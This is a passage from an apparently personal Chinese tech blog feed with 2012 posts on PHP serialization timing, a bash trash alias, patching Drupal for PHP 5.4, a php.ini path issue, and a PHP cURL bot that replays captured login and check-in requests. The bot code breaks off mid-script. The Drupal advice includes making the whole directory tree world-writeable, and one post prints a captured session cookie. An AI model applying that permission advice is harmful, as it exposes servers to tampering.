</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;sertialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s), &quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;sertialize longth:&quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sdata</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$rdata</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;js.php&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$rdata</span><span class="err">，</span><span class="k">TRUE</span><span class="p">);</span>  <span class="c1">//反序列化，</span>
</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;unserialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s)&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sertialize <span class="nb">time</span>:0.00067996978759766<span class="o">(</span>s<span class="o">)</span>, sertialize longth:48891
</span><span class='line'>unserialize <span class="nb">time</span>:0.0031712055206299<span class="o">(</span>s<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>从上面的几个小测试可以看出，json_encode 和 serialize 的转换效率其实是很接近的，但是因为
json_encode 序列化后的数据会比serialize序列化的数据小很多（从测试数据比较少了3倍多），
导致在写文本的时候，serialize方法比json_encode方法消耗多了很多时间。而thinkphp采用的文
件缓存效率相对较低，也不清楚thinkphp是出于哪种原因而采用这种办法。希望Thinkphp以后会修改
F方法的缓存方式。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux下的回收站]]></title>
    <link href="http://sunkid.me/blog/2012/05/27/linux-trash/"/>
    <updated>2012-05-27T18:48:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/05/27/linux-trash</id>
    <content type="html"><![CDATA[<p>linux 下的rm是非常邪恶的命令，我就曾经因为一条失误的rm命令，把我近一个月的代码给删了
（那时候还没用svn，git这些工具），还好后来花了2天找回大部分代码，不然真的心都碎了。</p>

<p>有了那次教训后，每次使用rm都会小心翼翼，担心稍微有误又悲催了。。于是后来就有了给linux创
建个回收站的想法。</p>

<p>在linux下创建个独有的回收站是很简单的，只要打开文件（~/.bash_profile）,添加以下这几行命令就可以了</p>

<figure class='code'><figcaption><span>.bash_profile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">alias </span><span class="nv">del</span><span class="o">=</span>trash
</span><span class='line'><span class="nb">alias </span><span class="nv">dell</span><span class="o">=</span><span class="s2">&quot;ls ~/.trash&quot;</span>
</span><span class='line'>
</span><span class='line'>trash<span class="o">(){</span>
</span><span class='line'>        mv <span class="nv">$@</span> ~/.trash/
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>以后呢，如果你想删除文件，就可以用del命令了，如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>del xxx //删除xxx文件/文件夹
</span></code></pre></td></tr></table></div></figure>


<p>你还可以通过dell命令来查看回收站里面的内容。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dell
</span><span class='line'>---------
</span><span class='line'>xxx
</span></code></pre></td></tr></table></div></figure>


<p><strong><em>最后注意： 修改.bash_profile 文件后，需要重新登陆bash才会生效。</em></strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php5.4下安装drupal7.12的注意事项]]></title>
    <link href="http://sunkid.me/blog/2012/04/28/install-drupal7-dot-12-for-php5-dot-4/"/>
    <updated>2012-04-28T17:42:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/04/28/install-drupal7-dot-12-for-php5-dot-4</id>
    <content type="html"><![CDATA[<p>自从在我的mac下把php升级到5.4后，就没少折腾过，这次折腾的是安装drupal 7.12。
目前官网最新的版本，还没兼容php 5.4，需要我们自己打2个补丁，包括几个环境配置上
需要注意的地方。</p>

<p>我们先看下第一个报错信息和相应的补丁包</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Notice: Array to string conversion in menu_link_save()
</span><span class='line'>(line 3155 of /Users/skc/NetBeansProjects/drupal7/includes/menu.inc).</span></code></pre></td></tr></table></div></figure>


<p>这个错误的讨论可以看这里：<a href="http://drupal.org/node/1338282#comment-5719166">Fix php notice in menu_link_save( )</a></p>

<p>我采用的解决补丁包是15#的这个：<a href="http://drupal.org/files/menu-link-save-1338282-15.patch">menu-link-save-1338282-15.patch</a></p>

<!--more-->


<p>给代码搭补丁的方式很简单，先下载patch文件到drupal的目录，然后执行命令</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>patch -p2 &lt; menu-link-save-1338282-15.patch
</span></code></pre></td></tr></table></div></figure>


<p>相关patch的命令资料也可以在这找到:<a href="http://study.chyangwa.com/IT/AIX/aixcmds4/patch.htm">patch</a></p>

<p>你可能还会遇到这样的错误：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Warning: Illegal string offset <span class="s1">&#39;field&#39;</span> in DatabaseCondition-&gt;__clone<span class="o">()</span>
</span><span class='line'><span class="o">(</span>line 1901 of /Users/skc/NetBeansProjects/drupal7/includes/database/query.inc<span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure>


<p>官网的讨论组也给出了相应的补丁包：<a href="http://drupal.org/files/database-query-clone-1414412.patch">database-query-clone-1414412.patch</a></p>

<p>如果你在还没安装补丁包之前尝试了安装，可能会出现
<a href="http://drupal.org/node/1171756#comment-5842376">“The 31 tables problem”</a>
（数据库只生成了31张表）。如果你出现这种情况，可以通过下面几个步骤解决。</p>

<pre><code>1. Clearing the database cache.
2. Dropping and recreating the database.
3. Making the entire directory tree (files and directories) world-writeable.
4. setting apc.stat=1 (and restarting Apache).
5. Setting wincache.ocenabled=0 (and restarting Apache).
6. Clearing the browser cache.
7. Switching among different browser families (Firefox, Chrome, IE) on different OSes (XP, Vista, Xubuntu).
8. Not installing into a subdirectory of the document root.
9. Only using the default .htaccess shipped with the source.
10. Stripping all other content from the document root.
</code></pre>

<p>这就是我目前在自己环境下遇到的几个问题，也许在不同的环境又会有其他的问题。比较庆幸的是drupal官网的讨论相当热烈，在上面基本可以找到大部分问题的解决办法（其中很多解决办法是来自开发者提供的）。</p>

<p>如果你遇到其他的问题，尽可试试在drupal讨论组寻找下答案 ^.^</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php配置文件加载错误(php.ini)]]></title>
    <link href="http://sunkid.me/blog/2012/04/16/php-configuration-file-path/"/>
    <updated>2012-04-16T18:38:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/04/16/php-configuration-file-path</id>
    <content type="html"><![CDATA[<p>最近在编译安装<a href="http://pecl.php.net/package/apc">APC</a>的时候，发现php一直加载不到APC模块。在确认编译没有错误后，开始从php上找问题。</p>

<p>结果发现个很坑爹的事</p>

<p><img src="http://sunkid.me/images/post/php_conf.jpg"></p>

<p>php的info页面显示的配置文件位置和用php &#8211;ini 命令显示不同，这里php &#8211;ini显示的配置文件目录才是php真正的加载目录，
导致我配置的时候编辑&#8221;/usr/local/ect/&#8221;目录下的php.ini一直没有生效，所以APC的模块也一直没加载到。</p>

<p>而这个情况的起因原来是因为我重新configure,但没有make clean!!</p>

<h3>囧</h3>

<p>被自己坑了。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php模拟数据包——自动签到]]></title>
    <link href="http://sunkid.me/blog/2012/04/13/fake-http/"/>
    <updated>2012-04-13T11:38:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/04/13/fake-http</id>
    <content type="html"><![CDATA[<p>最近几个室友染上研究自动签到机的恶习。</p>

<p>其中包括有用C写socket 接发伪http包的<a href="http://www.tinpont.com/">@tinpont</a></p>

<p>有用javascript 在浏览器做类似XSS的自动登陆签到的<a href="http://www.jqyang.com/">@NewBie</a></p>

<p>还有用au3 做模拟点击来签到的<a href="http://www.schance.com/">@SCbant</a>. (顺便在这鄙视上面2个做了后不写出来分享的童鞋.凸 凸)</p>

<p>不甘落后，我也写个php版本的伪http包自动签到：）</p>

<br/>


<p>首先，分析下某网站的登陆页面和签到页面：</p>

<!--more-->


<h4>登陆页面：</h4>

<p><img src="http://sunkid.me/images/post/fake_http_1.jpg" width="600" height="800"></p>

<p>很容易我们已经获得了登陆的地址，接着开始找签到的地址。</p>

<p>发现签到的按钮上是一段这样子的a连接</p>

<figure class='code'><figcaption><span>check_in_a </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">&quot;checkin text&quot;</span> <span class="na">id=</span><span class="s">&quot;check_in&quot;</span> <span class="na">href=</span><span class="s">&quot;javascript:;&quot;</span> <span class="na">title=</span><span class="s">&quot;&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  签到
</span><span class='line'>  <span class="nt">&lt;span&gt;</span>Check in<span class="nt">&lt;/span&gt;</span>
</span><span class='line'><span class="nt">&lt;/a&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>没有直接写明链接地址，于是从js入手找，方法很简单，在主页的代码上搜索这个按钮的id &#8220;check_in&#8221;</p>

<p>很快可以找到该id绑定了一个点击触发函数,代码如下：</p>

<figure class='code'><figcaption><span>check_in_js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#check_in&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
</span><span class='line'>          <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">unbind</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">);</span>
</span><span class='line'>          <span class="c1">//这个post的地址无疑就是签到的地址了</span>
</span><span class='line'>          <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/task/signin&#39;</span><span class="p">,{},</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="nx">paint</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</span><span class='line'>              <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#check_in&quot;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
</span><span class='line'>                  <span class="nx">unpaint</span><span class="p">();</span>
</span><span class='line'>              <span class="p">});</span>
</span><span class='line'>          <span class="p">});</span>
</span><span class='line'>      <span class="p">});</span>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>这时，两个主要的地址我们已经找出来了。</p>

<p>紧接着，通过浏览器登陆网站，正常签到。在这个过程的同时，我们需要截获登陆和签到的http数据包.
这需要借助一些嗅探器，我在mac下用的是<a href="http://www.wireshark.org/download.html">Wireshark</a></p>

<p>这是截获到登陆请求的数据包：</p>

<p><img src="http://sunkid.me/images/post/fake_http_2.jpg" width="600" height="800"></p>

<p>这是登陆成功后返回的数据包:</p>

<p><img src="http://sunkid.me/images/post/fake_http_3.jpg" width="600" height="800"></p>

<p>请求的数据包我们安着post的值封装发过去就可以了，这里我们主要分析下成功返回的数据包：</p>

<p>首先返回的http状态是302重定向，带一个Set-Cookie：member_auth=xxxxxx<br/>
我们第一次登陆要抓取的就是这个member_auth的值。</p>

<p>我们接着看签到时候http包的行为</p>

<p>截获到签到请求的数据包：</p>

<p><img src="http://sunkid.me/images/post/fake_http_4.jpg" width="600" height="800"></p>

<p>图片中的cookie只显示了一部分，附上完整的cookie值：</p>

<figure class='code'><figcaption><span>cookie</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">Cookie:</span><span class="n">cnzz_a921634</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">ltime</span><span class="o">=</span><span class="mi">1334193113668</span><span class="p">;</span> <span class="n">rtime</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">sin921634</span><span class="o">=</span><span class="n">none</span><span class="p">;</span> <span class="n">__gads</span><span class="o">=</span><span class="n">ID</span><span class="o">=</span><span class="mi">7</span><span class="n">c2eb69c29c523a2</span><span class="o">:</span><span class="n">T</span><span class="o">=</span><span class="mi">1334193113</span><span class="o">:</span><span class="n">S</span><span class="o">=</span><span class="n">ALNI_Mb0TRs4TR3yexCHEW4kFeWwZLI1Zw</span><span class="p">;</span> <span class="n">index_logined_hotmusic_tab</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">__utma</span><span class="o">=</span><span class="mf">251084815.740794992.1334193113.1334193113.1334193113.1</span><span class="p">;</span> <span class="n">__utmb</span><span class="o">=</span><span class="mf">251084815.1.10.1334193113</span><span class="p">;</span> <span class="n">__utmc</span><span class="o">=</span><span class="mi">251084815</span><span class="p">;</span> <span class="n">__utmz</span><span class="o">=</span><span class="mf">251084815.1334193113.1.1</span><span class="p">.</span><span class="n">utmcsr</span><span class="o">=</span><span class="p">(</span><span class="n">direct</span><span class="p">)</span><span class="o">|</span><span class="n">utmccn</span><span class="o">=</span><span class="p">(</span><span class="n">direct</span><span class="p">)</span><span class="o">|</span><span class="n">utmcmd</span><span class="o">=</span><span class="p">(</span><span class="n">none</span><span class="p">);</span> <span class="n">t_sign_auth</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">member_auth</span><span class="o">=</span><span class="mi">7</span><span class="n">hjWn1eRWGaWJqK5kKzM</span><span class="o">%</span><span class="mi">2</span><span class="n">BxaZJQkiW3UWiEO3hkVZTwkiFLpXlhVEuW</span><span class="o">%</span><span class="mi">2</span><span class="n">BSpOTZz4</span><span class="o">%</span><span class="mi">2</span><span class="n">BiLYNKMlw</span>
</span></code></pre></td></tr></table></div></figure>


<p>呃，这看上去有点多，而且这些数据不像是从服务器通过set-cookie过来的，猜测是通过js设置的cookie值。
我选取了&#8217;__utmb&#8217;对在页面上的js进行搜索，结果在”http://www.google-analytics.com/ga.js“发现了这个值。</p>

<p>到这里，我们知道这个是google analytics设置的cookie，对该网页的签到是不会影响。
通过继续分析，我们可以排除大部分cookie,剩下的cookie值就是我们需要伪造的了：</p>

<figure class='code'><figcaption><span>cookie</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">Cookie:</span><span class="n">index_logined_hotmusic_tab</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">t_sign_auth</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">member_auth</span><span class="o">=</span><span class="mi">7</span><span class="n">hjWn1eRWGaWJqK5kKkiW3UWiEO3hkVZTwkiFLpXlhVEuW</span><span class="o">%</span><span class="mi">2</span><span class="n">BSpOTZz4</span><span class="o">%</span><span class="mi">2</span><span class="n">BiLYNKMlw</span>
</span></code></pre></td></tr></table></div></figure>


<p>通过继续对页面分析，发现，index_logined_hotmusic_tab的值在js中设置为常数1,t_sign_auth的值在打开首页的时候通过set-cookie得到。</p>

<p>这时，我们只需要截获并伪造这三个cookie,就可以签到模拟请求了 ：）</p>

<p>下面截获到签到请求成功返回的数据包：</p>

<p><img src="http://sunkid.me/images/post/fake_http_5.jpg" width="600" height="800"></p>

<p>到此，我们的http数据包就分析结束了，接下来就是编码的工作了,下面附上源码。</p>

<figure class='code'><figcaption><span>Signin</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//配置文件，填写用户密码信息</span>
</span><span class='line'><span class="nv">$logins</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>    <span class="k">array</span><span class="p">(</span>
</span><span class='line'>  <span class="s2">&quot;email&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxxxx@qq.com&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;password&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxxx&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="p">),</span>
</span><span class='line'>    <span class="k">array</span><span class="p">(</span>
</span><span class='line'>  <span class="s2">&quot;email&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxxx@qq.com&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;password&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxxx&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="p">),</span>
</span><span class='line'>    <span class="k">array</span><span class="p">(</span>
</span><span class='line'>  <span class="s2">&quot;email&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxx@qq.com&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s2">&quot;password&quot;</span> <span class="o">=&gt;</span> <span class="s1">&#39;xxxx&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//登陆网址</span>
</span><span class='line'><span class="nv">$loginUrl</span> <span class="o">=</span> <span class="s2">&quot;http://www.xxx.com/member/login&quot;</span><span class="p">;</span>
</span><span class='line'><span class="c1">//网址首页</span>
</span><span class='line'><span class="nv">$Url</span> <span class="o">=</span> <span class="s2">&quot;http://www.xxx.com/&quot;</span><span class="p">;</span>
</span><span class='line'><span class="c1">//签到网址</span>
</span><span class='line'><span class="nv">$signinUrl</span> <span class="o">=</span> <span class="s2">&quot;http://www.xxxx.com/task/signin&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//http头部，模拟浏览器行为</span>
</span><span class='line'><span class="nv">$header</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>    <span class="s2">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;Origin: http://www.xxxx.com&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;Referer: http://www.xxxx.com/&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;Accept-Language: zh-cn&quot;</span>
</span><span class='line'><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">foreach</span> <span class="p">(</span><span class="nv">$logins</span> <span class="k">as</span> <span class="nv">$login</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$login</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$login</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//模拟post数据包</span>
</span><span class='line'>  <span class="nv">$postData</span> <span class="o">=</span> <span class="s2">&quot;email=&quot;</span><span class="o">.</span><span class="nv">$email</span><span class="o">.</span><span class="s2">&quot;&amp;password=&quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;&amp;autologin=1&amp;submit=%E7%99%BB+%E5%BD%95&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//初始化CURL</span>
</span><span class='line'>  <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HEADER_OUT</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$header</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置post数据包</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$postData</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*  * *********************第一次发送模拟数据包请求*************************** */</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置请求地址   </span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$loginUrl</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//发送登陆请求</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//读取member_auth值</span>
</span><span class='line'>  <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^Set-Cookie: member_auth=(.*?);/m&#39;</span><span class="p">,</span> <span class="nv">$res</span><span class="p">,</span> <span class="nv">$member</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//判断登陆是否成功</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$member</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;[Error]:Login false(</span><span class="si">$email</span><span class="s2">)&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//模拟cookie数据</span>
</span><span class='line'>  <span class="nv">$cookie</span> <span class="o">=</span> <span class="s2">&quot;member_auth=&quot;</span> <span class="o">.</span> <span class="nv">$member</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*  * *********************第二次发送模拟数据包请求*************************** */</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置cookie数据</span>
</span><span class='line'>  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_COOKIE</span><span class="p">,</span> <span class="nv">$cookie</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//设置请求地址   </span>
